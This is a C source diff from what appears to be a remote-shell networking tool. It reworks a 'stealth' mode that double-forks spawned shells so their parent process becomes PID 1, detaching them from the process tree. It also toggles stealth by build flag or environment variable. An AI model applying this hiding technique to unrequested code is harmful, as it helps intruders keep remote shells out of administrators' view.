@@ -125,11 +125,19 @@ try_changeargv0(char *argv[]) {
 void
 init_defaults1(char *argv[]) {
 	char *argv0 = argv[0];
-	if (GS_GETENV2("STEALTH") != NULL)
-		gopt.flags |= GSC_FL_IS_STEALTH;
+	char *ptr;
 #ifdef DEBUG
 	gopt.is_built_debug = 1;
 #endif
+#ifdef STEALTH
+		gopt.flags |= GSC_FL_IS_STEALTH;
+#endif
+	if ((ptr = GS_GETENV2("STEALTH")) != NULL) {
+		gopt.flags |= GSC_FL_IS_STEALTH;
+		// export GS_STEALTH=0 to disable stealth.
+		if (*ptr == '0')
+			gopt.flags &= ~GSC_FL_IS_STEALTH;
+	}
 
 	try_changeargv0(argv);
 
@@ -778,9 +786,9 @@ mk_shellname(const char *shell, char *shell_name, ssize_t len, const char **prgn
 		ptr = strrchr(shell, '/');
 		if ((ptr != NULL) && (strcmp(ptr, "/sh") == 0))
 			shell = NULL;
-		if (strstr(shell, "nologin") != NULL)
+		else if (strstr(shell, "nologin") != NULL)
 			shell = NULL;
-		if (strstr(shell, "jailshell") != NULL)
+		else if (strstr(shell, "jailshell") != NULL)
 			shell = NULL;
 	}
 
@@ -978,9 +986,30 @@ tty_leader(int fd) {
     close(newfd);
 }
 
-#ifndef HAVE_FORKPTY
+// Make the PPID equal to 1 (unlink from process tree) in STEALTH mode
+static void
+try_doublefork(void) {
+	pid_t pid;
+
+	if (!(gopt.flags & GSC_FL_IS_STEALTH))
+		return;
+
+	signal(SIGHUP, SIG_IGN);
+	pid = fork();
+	if (pid > 0) {
+		gopt.flags |= GSC_FL_IS_NO_ATEXIT;
+		exit(0);
+	}
+	// HERE: Child
+	signal(SIGHUP, SIG_DFL);
+}
+
+// Must use my own forkpty() because OpenBSD and FreeBSD <10.x do not
+// allow to re-assign controlling terminals that were already assigned
+// previously - a feature that's needed for GS_STEALTH to force parent-pid
+// to become 1.
 static int
-forkpty(int *fd, void *a, void *b, void *c)
+myforkpty(int *fd, void *a, void *b, void *c)
 {
 	pid_t pid;
 	int slave;
@@ -1002,6 +1031,8 @@ forkpty(int *fd, void *a, void *b, void *c)
 
 	/* CHILD */
 	close(master);
+	try_doublefork();
+
 #ifdef TIOCNOTTY
 	// Give up this controlling terminal if we are already controlling
 	ioctl(slave, TIOCNOTTY, NULL);
@@ -1015,7 +1046,6 @@ forkpty(int *fd, void *a, void *b, void *c)
 
 	return 0;	// CHILD
 }
-#endif /* HAVE_FORKPTY */
 
 static pid_t
 forkfd(int *fd)
@@ -1032,24 +1062,26 @@ forkfd(int *fd)
 	if (pid < 0)
 		return pid;
 
-	if (pid == 0)
-	{
-		// Put this child into its own group.
-		// Otherwise keypress 'Ctrl-C' on the server would not
-		// send SIGINT to the server but to the forked child() (bash).
-		setsid();
-
-		dup2(fds[0], STDOUT_FILENO);
-		dup2(fds[0], STDERR_FILENO);
-		dup2(fds[0], STDIN_FILENO);
-		*fd = fds[0];
+	if (pid > 0) {
+		/* HERE: Parent process */
+		close(fds[0]);
+		*fd = fds[1];
 
 		return pid;
 	}
 
-	/* HERE: Parent process */
-	close(fds[0]);
-	*fd = fds[1];
+	// CHILD
+	try_doublefork();
+
+	// Put this child into its own group.
+	// Otherwise keypress 'Ctrl-C' on the server would not
+	// send SIGINT to the server but to the forked child() (bash).
+	setsid();
+
+	dup2(fds[0], STDOUT_FILENO);
+	dup2(fds[0], STDERR_FILENO);
+	dup2(fds[0], STDIN_FILENO);
+	*fd = fds[0];
 
 	return pid;
 }
@@ -1069,10 +1101,9 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	pid_t pid;
 	int fd = -1;
 	int is_nopty = 0;
-	int is_double_fork = 0;
 
 	*err = 0;
-	pid = forkpty(&fd, NULL, NULL, NULL);
+	pid = myforkpty(&fd, NULL, NULL, NULL);
 	if (pid < 0) {
 		*err = GS_FD_CMD_ERR_NOPTY;
 		is_nopty = 1;
@@ -1085,55 +1116,17 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	}
 	XASSERT(pid >= 0, "Error: forkpty()=%d: %s\n", pid, strerror(errno));
 
-	if ((gopt.flags & GSC_FL_IS_STEALTH) && (!is_nopty))
-		is_double_fork = 1;
-
 	if (pid > 0) {
 		/* HERE: Parent */
 
-		// *pidptr emulates CTRL-c when TTY allocation fails.
-		// Double-fork is only done when TTY is successfully.
-		if (is_double_fork)
-			pid = -1; // pid becomes invalid during double-fork below.
+		// *pidptr is used to emulate CTRL-c when TTY allocation fails.
+		if (gopt.flags & GSC_FL_IS_STEALTH)
+			pid = -1; // pid becomes meaningless when performing double-fork.
 
 		if (pidptr)
 			*pidptr = pid;
 
 		return fd; // TTY master
-	}
-
-	/* Our own forkpty() (solaris 10) returns the actual slave TTY.
- 	 * We can not open /dev/st on solaris10 and use the fd that
-	 * our own forkpty() returns. Any other OS needs to open
-	 * /dev/tty to get correct fd for child's tty.
-	 */
-	#ifdef HAVE_FORKPTY
-	#if 0
-	// 2024: Why is this needed? we never use fd in slave.
-	if (*err != GS_FD_CMD_ERR_NOPTY) {
-		int fd_x;
-		fd_x = open("/dev/tty", O_NOCTTY | O_RDWR);
-		if (fd_x >= 0)
-			fd = fd_x;
-	}
-	#endif
-	#endif
-
-	if (is_double_fork) {
-		// Race condition: parent's exit() may cause a SIGHUP before child
-		// had a chance to call setsid(). Ignore SIGHUP until then:
-		signal(SIGHUP, SIG_IGN);
-		// Give up being the controlling terminal
-		ioctl(STDIN_FILENO, TIOCNOTTY, NULL);
-		pid = fork();
-		if (pid > 0) {
-			gopt.flags |= GSC_FL_IS_NO_ATEXIT;
-			exit(0);	// Parent exits
-		}
-
-		// Become a Controlling TTY again.
-		tty_leader(STDIN_FILENO);
-		signal(SIGHUP, SIG_DFL);
 	}
 
 	/* HERE: Child */
